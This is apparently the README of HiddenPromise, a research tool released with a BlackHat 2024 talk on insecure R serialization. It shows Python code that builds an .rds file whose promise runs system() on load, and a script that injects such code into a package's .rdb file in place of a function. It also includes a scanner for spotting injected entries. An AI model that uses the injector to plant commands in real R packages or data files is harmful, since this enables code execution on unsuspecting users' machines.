# HiddenPromise

This repository houses HiddenPromise, a dissassembler and compiler for R .rdx, .rdb, and .rds files. The tool was released during BlackHat US 2024 along with the talk [We R in a Right Pickle With All These Insecure Serialization Formats](https://www.blackhat.com/us-24/briefings/schedule/index.html#we-r-in-a-right-pickle-with-all-these-insecure-serialization-formats-39137) and allows users to recreate all of the techniques described in the talk including the ability to scan RDB files for malicious code and inject malicious code into RDB files. For more on the R serialization vulnerability, see [our blog on the topic](https://hiddenlayer.com/research/r-bitrary-code-execution/)

## Installation

```
git clone https://github.com/hiddenlayer-engineering/HiddenPromise.git
cd HiddenPromise
pip install .
```

## Compiler

This is the serialized file compiler, it has five functions:

- as_integer
    - this function will output the given value as integers
- as_real
    - this function will output the given value as real values
- build_header
    - this function initialises the header of the serialized file you're constructing
- add_instruction
    - this adds the given instruction to the serialized file
- craft_file
    - this function converts an array of instructions into a full serialized file and returns it

As shown in `./examples/create_exploit.py` it is possible to use the compiler to generate RDX files directly:

```python
from hiddenpromise.compiler import Opcode, Compiler, TYPES
import gzip

instructions = [
    Opcode(TYPES.PROMSXP, 0, False, False, False,None,False),

    Opcode(TYPES.UNBOUNDVALUE_SXP, 0, False, False, False,None,False),

    Opcode(TYPES.LANGSXP, 0, False, False, False,None,False),
    Opcode(TYPES.SYMSXP, 0, False, False, False,None,False),
    Opcode(TYPES.CHARSXP, 64, False, False, False,"system",False),
    Opcode(TYPES.LISTSXP, 0, False, False, False,None,False),
    Opcode(TYPES.STRSXP, 0, False, False, False,1,False),
    Opcode(TYPES.CHARSXP, 64, False, False, False,'echo "pwned by HiddenLayer"',False),
    Opcode(TYPES.NILVALUE_SXP, 0, False, False, False,None,False),
]

gzip.open("pwned.rds", "wb").write(Compiler.craft_file(instructions))
```

## Parser

The parser allows users to parse RDX type files into python objects for traversal:

For example, we can decompile our pwned.rds file created in the above with the below:

```python
from hiddenpromise.parser import Parser

data = open("../example_files/pwned.rds", "rb").read()
parsed = Parser(data).parse()
print(parsed)
```

Printing out the parsed object allows us to see the object representation:

```
RData(
  versions: <hiddenpromise.parser.RVersions object at 0x102bd3b50>
  extra: <hiddenpromise.parser.RExtraInfo object at 0x102bd31c0>
  object: 
    RObjectType.PROM
      value:
        RObjectType.UNBOUNDVALUE
          value:
            None
        RObjectType.LANG
          value:
            RObjectType.SYM
              value:
                RObjectType.CHAR
                  value:
                    b'system'
            RObjectType.LIST
              value:
                RObjectType.STR
                  value:
                    RObjectType.CHAR
                      value:
                        b'echo "pwned by HiddenLayer"'
                RObjectType.NILVALUE
                  value:
                    None

)
```

## Injector

We have also provided a tool to inject malicious code into RDB files, this can be done with the below script:

```python
from hiddenpromise.injector import inject_code
from hiddenpromise.compiler import Opcode, TYPES

instructions = [
    Opcode(TYPES.PROMSXP, 0, False, False, False,None,False),

    Opcode(TYPES.UNBOUNDVALUE_SXP, 0, False, False, False,None,False),

    Opcode(TYPES.LANGSXP, 0, False, False, False,None,False),
    Opcode(TYPES.SYMSXP, 0, False, False, False,None,False),
    Opcode(TYPES.CHARSXP, 64, False, False, False,"system",False),
    Opcode(TYPES.LISTSXP, 0, False, False, False,None,False),
    Opcode(TYPES.STRSXP, 0, False, False, False,1,False),
    Opcode(TYPES.CHARSXP, 64, False, False, False,'echo "pwned by HiddenLayer"',False),
    Opcode(TYPES.NILVALUE_SXP, 0, False, False, False,None,False),
]

if __name__ == "__main__":
    inject_code("../example_files/compiler.rdx", "../example_files/compiler.rdb", b"notifyBadCall", instructions)
```

## Package Scanning

Located in `./scripts/scan_packages.py` we have provided a tool which finds RDX and RDB files and extracts the first opcode for each code chunk in an RDB file. When we run it on the original and the exploited for the file we injected above we can see the differences:

Original:

```
../example_files/compiler.rdx Type: RObjectType.VEC
         .__NAMESPACE__. [591, 54] First Instruction: RObjectType.PERSISTSXP
         ...
         notifyBadCall [175144, 368] First Instruction: RObjectType.CLO
```

Injected:

```
../example_files/compiler_malicious.rdx Type: RObjectType.VEC
         .__NAMESPACE__. [591, 54] First Instruction: RObjectType.PERSISTSXP
         ...
         notifyBadCall [175144, 93] First Instruction: RObjectType.PROM
```